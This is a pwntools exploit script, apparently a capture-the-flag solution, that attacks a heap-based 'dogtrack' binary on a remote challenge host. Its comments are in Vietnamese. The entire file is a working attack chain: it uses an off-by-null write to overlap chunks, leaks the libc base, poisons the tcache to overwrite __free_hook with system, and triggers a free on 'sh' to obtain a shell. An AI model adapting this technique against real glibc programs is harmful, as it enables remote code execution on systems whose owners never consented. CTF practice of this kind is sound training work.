from pwn import *

exe = ELF('./dogtrack', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.log_level = 'info'

def start():
    # return process(exe.path)
    return remote('dogtrack-88290b1b8b6d91ce.instancer.batmans.kitchen', 1337, ssl=True)

p = start()

def breed_exact(idx, name, speed):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(idx).encode())
    if len(name) == 31:
        p.sendafter(b"> ", name)
    else:
        p.sendlineafter(b"> ", name)
    p.sendlineafter(b"> ", speed)
    p.sendlineafter(b"> ", b"3")

def release(idx):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(idx).encode())
    p.sendlineafter(b"> ", b"3")

def race(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(idx).encode())

def wipe_multiple(indices):
    p.sendlineafter(b"> ", b"3")
    for idx in indices:
        p.sendlineafter(b"> ", b"2")
        p.sendlineafter(b"> ", str(idx).encode())
    p.sendlineafter(b"> ", b"3")

def forge(idx1, idx2):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"> ", str(idx1).encode())
    p.sendlineafter(b"> ", str(idx2).encode())
    p.sendlineafter(b"> ", b"3")

def trigger():
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", b"0")

# ==========================================
# 1. SETUP CHUNKS
# ==========================================
log.info("Setting up chunks layout...")
# Đặt tốc độ là "sh". Khi free Dog 0, nó sẽ chạy system("sh\n")
breed_exact(0, b"Dog0", b"sh")
race(0) # Chunk A (Record 0)
breed_exact(1, b"Dog1", b"A") 
race(1) # Chunk C (Record 1)
race(1) # Guard chunk (Record 2)

# Đổ đầy tcache 0x100
for _ in range(7):
    race(1) # Record 3 -> 9
wipe_multiple([9, 8, 7, 6, 5, 4, 3])

# ==========================================
# 2. TRIGGER OFF-BY-NULL & CONSOLIDATE
# ==========================================
log.info("Triggering off-by-null...")
wipe_multiple([0]) # Đưa Chunk A vào Unsorted Bin
release(1) # Đưa Dog 1 vào Tcache 0x30

# Lấy lại Dog 1, overwrite 1 byte NULL vào C->size và chèn prev_size = 0x130 (size A + Dog 1)
breed_exact(1, b"X"*24 + p64(0x130)[:7], b"A")
wipe_multiple([1]) # Giải phóng C. C check prev_size và gộp trùm qua Dog 1 đến tận A.

# ==========================================
# 3. LEAK LIBC
# ==========================================
log.info("Emptying tcache and leaking libc...")
for _ in range(7):
    race(1) # Rút cạn 7 chunks trong tcache 0x100 ra

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"> ", b"1") # Cắt chunk Unsorted Bin, fd/bk đè lên Dog 1. Leak!
p.recvuntil(b"\n")
leak_str = p.recvuntil(b" now entering", drop=True)
res = leak_str.split(b"\n")[-1]
leak = u64(res.ljust(8, b"\x00"))

libc.address = leak - 0x3ebca0
log.success(f"Libc Base: {hex(libc.address)}")
log.success(f"Free Hook: {hex(libc.sym['__free_hook'])}")

# ==========================================
# 4. TCACHE POISONING (VIA FORGE)
# ==========================================
log.info("Poisoning Tcache...")
race(0) # Tạo overlap, winRecords[9] giờ trỏ chung vào 1 vùng nhớ với Dog 1
breed_exact(2, p64(libc.sym['__free_hook']), b"A")
race(2) # winRecords[10] chứa __free_hook

wipe_multiple([7]) # Giải phóng 1 record mồi để tcache count = 1
release(1) # Giải phóng vùng Overlap vào tcache 0x100. count = 2.
forge(9, 10) # Chép nội dung winRecords[10] đè vào fd của winRecords[9] (__free_hook)

# ==========================================
# 5. OVERWRITE & GET SHELL
# ==========================================
log.info("Executing system('sh')...")
breed_exact(1, b"dummy", b"A")
race(1) # Trả về chunk ảo (count 2 -> 1)
release(1) 

breed_exact(1, p64(libc.sym['system']), b"A")
race(1) # Trả về __free_hook. Chép tên chó vào (chép system đè __free_hook)

trigger() # Giải phóng Dog 0 ("sh\n" ) -> pop shell

p.interactive()